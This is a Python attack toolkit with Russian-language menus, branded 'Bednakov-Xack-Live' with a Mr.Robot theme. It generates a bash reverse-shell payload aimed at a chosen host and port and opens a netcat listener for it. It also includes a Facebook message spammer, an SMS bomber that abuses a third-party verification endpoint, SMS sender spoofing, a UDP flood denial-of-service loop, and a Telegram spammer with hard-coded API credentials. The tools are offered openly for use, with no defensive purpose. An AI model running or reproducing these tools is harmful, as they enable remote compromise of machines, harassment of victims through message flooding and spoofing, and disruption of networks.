## Bednakov-Xack-Live
# -*- coding: utf-8 -*-
# Бедняков Денис Леонидович
# GitHub http://github.com/bednakovdenis
##
import telethon
import os, sys, time, socket, random, requests
from telethon import TelegramClient, sync, utils

netcatrat_banner = """             __              __                  __
 _____ _____|  |_ ____ _____|  |_     ____ _____|  |_
|     |  -__|   _|  __|  _  |   _|   |   _|  _  |   _|
|__|__|_____|____|____|___,_|____|   |__| |___,_|____|
"""
facebookspam_banner = """  ____ __
 |   _|  |__     _____ _____ _____ ________
 |   _|  _  |   |__ --|  _  |  _  |        |
 |__| |_____|   |_____|   __|___,_|__|__|__|
                      |__|
"""
smsbomber_banner = """                           __                   __
  _____ ________ _____    |  |__ _____ ________|  |__
 |__ --|        |__ --|   |  _  |  _  |        |  _  |
 |_____|__|__|__|_____|   |_____|_____|__|__|__|_____|

"""
smsspoofelk_banner = """                                                   ____
  _____ ________ _____     _____ _____ _____ _____|   _|
 |__ --|        |__ --|   |__ --|  _  |  _  |  _  |   _|
 |_____|__|__|__|_____|   |_____|   __|_____|_____|__|
                                |__|
"""
telegramspam_banner = """  __   __
 |  |_|  |_____     _____ _____ _____ ________
 |   _|  |  _  |   |__ --|  _  |  _  |        |
 |____|__|___  |   |_____|   __|___ _|__|__|__|
         |_____|         |__|
"""
denialofserviceattack_banner = """           __           ____ __                __
  __ __ __|  |_____    |   _|  |_____ _____ __|  |
 |  |  |  _  |  _  |   |   _|  |  _  |  _  |  _  |
 |_____|_____|   __|   |__| |__|_____|_____|_____|
             |__|
"""

def clearscreen():
	if sys.platform == "linux2":
		os.system("clear")
	elif sys.platform == "win32":
		os.system("cls")
	else:
		os.system("clear")

def restart_program():
	python = sys.executable
	os.execl(python, python, * sys.argv)
	curdir = os.getcwd()

def backtomenu_option():
	print(backtomenu_banner)
	backtomenu = input("Bednakov-Xack-Live > ")

	if backtomenu == "99":
		restart_program()
	elif backtomenu == "00":
		sys.exit()
	else:
		print("\nОШИБКА: неверный ввод")
		time.sleep(2)
		restart_program()

__banner__ = """
\033[1;37m          ,
\033[1;37m      _,-""-._
\033[1;37m    ,'        '.
\033[1;37m   / \033[1;31m   ,-,  ,-\033[1;37m \ \033[0m
\033[1;37m  |  \033[1;31m  /   \ | o| \033[0m
\033[1;37m  \  \033[1;31m  `-o-'  `-'           __  __            ____       _           _
\033[1;37m   `,   _.--'`'--`\033[1;31m         |  \/  |_ __      |  _ \ ___ | |__   ___ | |_
\033[1;37m     `--`---'  \033[1;31m            | |\/| | '__|     | |_) / _ \| '_ \ / _ \| __|
\033[1;37m       ,' '    \033[1;31m            | |  | | |     _  |  _ < (_) | |_) | (_) | |_
\033[1;37m     ./ ,  `,  \033[1;31m            |_|  |_|_|    (_) |_| \_\___/|_.__/ \___/ \__| 
\033[1;37m     / /     \  \033[1;37m       Author: \033[1;31m<3\033[0m\033[1;37m Bednakov Denis \033[0m
\033[1;37m    (_)))_ _," \033[0m
\033[1;37m        ||||        GitHub http://github.com/bednakovdenis\033[0m
\033[1;37m       _||||_,      https://www.facebook.com/cicada3301denis\033[0m
\033[1;37m------(_,-._)))-----------------------------------------\033[0m
"""
backtomenu_banner = """
  99) Вернуться в главное меню
  00) Выход из Mr.Robot
"""

help_msg = """
Команды          Описание
---------        ------------
help             Распечатать это сообщение
banner           Распечатать баннер
clear            Очистить экран
restart          Перезапустите программу
contact          Контакт
about            Обо мне
version          Версия для печати
exit             Выйти из программы
"""
clearscreen()
print(__banner__)
print("""
Выберите из меню:
  01) Создайть полезную нагрузку
  02) Facebook Атака спам-сообщения
  03) Векторы атаки  SMS
  04) Векторы SMS-атак Spoof
  05) Dos Атака
  06) Telegram Атака спам-сообщения
  07) Другие команды


  00) Выйти из Mr.Robot
""")
while True:
	try:
		santet = input("Bednakov-Xack-Live > ")

		if santet == "01" or santet == "1":
			print(netcatrat_banner)
			nccheck = os.system("which nc")
			if nccheck != 0:
				print("[-] Netcat еще не установлен!!!")
				backtomenu_option()
			else:
				print("\n  01) Создать полезную нагрузку")
				print("  02) Начать Сесию")
				print("\n  00) Выход")
				netcatrat = input("\Bednakov-Xack-Live > ")
				if netcatrat.strip() in "01 1".split():
					lhost = input("\nBednakov-Xack-Live > установить LHOST ")
					lport = input("Bednakov-Xack-Live > установить LPORT ")
					output = input("Bednakov-Xack-Live > установить выход ")
					try:
						file = open(output, 'w')
						file.write("bash -i > /dev/tcp/%s/%s 0<&1 2>&1" % (lhost,lport))
						file.close()
						slistener = input("\nЗапустить Cесию ? [y/N] ")
						if slistener.strip() in "y Y".split():
							lhost = input("\nBednakov-Xack-Live > установить LHOST ")
							lport = input("Bednakov-Xack-Live > установить LPORT ")
							os.system("echo && nc -lvp %s %s" % (lport, lhost))
							backtomenu_option()
						elif slistener.strip() in "n N".split():
							backtomenu_option()
						else:
							print("")
					except IOError as e:
						print("\nОШИБКА:",e)
						backtomenu_option()
				elif netcatrat.strip() in "02 2".split():
					lhost = input("\nустановить LHOST ")
					lport = input("установить LPORT ")
					os.system("echo && nc -lvp %s %s" % (lport, lhost))
					backtomenu_option()
				elif netcatrat.strip() in "00 0".split():
					restart_program()
				else:
					print("\nОШИБКА: неверный ввод")
					time.sleep(2)
					restart_program()
		elif santet == "02" or santet == "2":
			print(facebookspam_banner)
			if os.path.isfile("token.log"):
				access_token = open("token.log","r").read()
			else:
				access_token = str(input("Bednakov-Xack-Live > установить ТОКЕН "))
				open("token.log","w").write(access_token)
			recipient_id = str(input("Bednakov-Xack-Live > установить ID ПОЛУЧАТЕЛЯ "))
			try: count = int(input("Bednakov-Xack-Live > установить Значение(шт) "))
			except(ValueError): count = 100
			message = str(input("Bednakov-Xack-Live > Ввести Сообшение "))
			headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1803 Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.116 Mobile Safari/537.36 OPR/44.6.2246.127414","Content-Type": "application/json"}
			data = {"recipient": {"id": recipient_id},"message": {"text": message}}
			for x in range(count):
				r = requests.post("https://graph.facebook.com/v6.0/me/messages?access_token={}".format(access_token), params=data, headers=headers)
				if r.status_code == 200:
					sys.stdout.write(u"\u001b[1000D[*] Отправлено {} сообщения для {}...".format(x+1, recipient_id))
				else:
					sys.stdout.write(u"\u001b[1000D[!] Не удалось отправить сообщения...")
				sys.stdout.flush()
			print("\n[!] Выполнено ... !!\n")
			backtomenu_option()
		elif santet == "03" or santet == "3":
			print(smsbomber_banner)
			phone_number = input("Номер Телефона: ")
			countx = input("Зеачение(шт): ")
			countx = int(countx)
			param = {'phone':''+phone_number,'smsType':'1'}
			count = 0
			while (count < countx):
				r = requests.post('http://sc.jd.id/phone/sendPhoneSms', data=param)
				if '"success":true' in r.text:
					print("\n\033[1;32m[  OK  ] Отправленно Успешно ... Задерка в 1 секунду...\033[0m")
				else:
					print("\n\033[1;31m[Неудачно] Отправить не удалось...Задерка в 1 секунду....\033[0m")
				time.sleep(1)
				count = count + 1
			print("\033[1;33m[ Готово ] Остановился...\033[0m")
			backtomenu_option()
		elif santet == "04" or santet == "4":
			print(smsspoofelk_banner)
			usernm = input("Username: ")
			passwd = input("Password: ")
			recipient = input("К: ")
			sender = input("От: ")
			messagetext = input("Сообщение: ")
			url = "https://api.46elks.com/a1/SMS"
			r = requests.post(url, data={'to': recipient,'from': sender,'message': messagetext}, auth=(usernm, passwd))
			print(r.json())
			backtomenu_option()
		elif santet == "05" or santet == "5":
			sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			bytes = random._urandom(1490)
			print(denialofserviceattack_banner)
			ip_addr = input("Bednakov-Xack-Live > установить IP_ADDR ")
			port = input("Bednakov-Xack-Live > установить PORT ")
			print("\n[~] Начать атаку...\n")
			time.sleep(2.5)
			sent = 0
			while True:
				try:
					sock.sendto(bytes, (ip_addr,int(port)))
					sent = sent + 1
					print("Отправлено %s пакет к %s через порт:%s"%(sent,ip_addr,port))
				except(KeyboardInterrupt):
					print("\n[!] Прекратить отправку пакета на %s..." %ip_addr)
					break
				except(EOFError):
					print("\n[!] Прекратить отправку пакета на %s..." %ip_addr)
					break
			backtomenu_option()
		elif santet == "06" or santet == "6":
			print(telegramspam_banner)
			api_id = 1148490
			api_hash = 'd82c81323285aeb9c2ba9ee420d8b009'
			client = TelegramClient('client',api_id,api_hash).start()
			target = input("Bednakov-Xack-Live > установить USERNAME/ID ")
			try: count = int(input("Bednakov-Xack-Live > установить Значение(шт) "))
			except(ValueError): count = 100
			urmsg = input("Bednakov-Xack-Live > Ввести сообщение ")
			for x in range(count):
				client.send_message(target, urmsg)
				sys.stdout.write(u"\u001b[1000D[*] Отправлено {} сообщения для {}...".format(x+1, target))
				sys.stdout.flush()
			print("\n[!] Выполнено ... !!\n")
			backtomenu_option()
		elif santet == "07" or santet == "7":
			print(help_msg)
		elif santet == "00" or santet == "0":
			sys.exit()
		elif santet.lower() == "Помощь":
			print(help_msg)
		elif santet.lower() == "баннер":
			print(__banner__)
		elif santet.lower() == "Очистеть":
			clearscreen()
		elif santet.lower() == "запустить снова":
			restart_program()
		elif santet.lower() == "Связь":
			print("Instagram: @dtlily\nTelegram: @dtlily\nFacebook: cgi.izo\nGitHub: Gameye98\nGitLab: dtlily\nYoutube: dtlily")
		elif santet.lower() == "about":
			print("Version 1.1\n\nCopyright (C) 2020 Bednakov-Xack-Live\n\nDedSecTL\nCvar1984\nCiKu370\nMr.TenSwapper07\namsitlab\n[M]izuno\n3RROR_TMX\nMr.K3N\nZetSec\nTroublemaker97\nL_Viole\nX14N23N6\nMR.R45K1N\nlord.zephyrus\n4cliba788\nmr0x100\nMrx04\nViruz\nMr_007\nITermSec\nIdannovita.\nBlackHole Security.")
		elif santet.lower() == "Версия":
			print("Версия 1.1")
		elif santet.lower() == "Выход":
			sys.exit()
		else:
			pass
	except(telethon.errors.rpcerrorlist.PhoneNumberInvalidError):
		print("Номер телефона недействителен (вызвано SendCodeRequest)")
		print("Вы должны сначала зарегистрировать свой номер телефона в Telegram\n")
	except(KeyboardInterrupt):
		print("\n[!] Закройте программу...")
		break
	except(EOFError):
		print("\n[!] Закройте программу...")
		break
	except Exception as e:
		print("\n[!] ошибка: "+e)
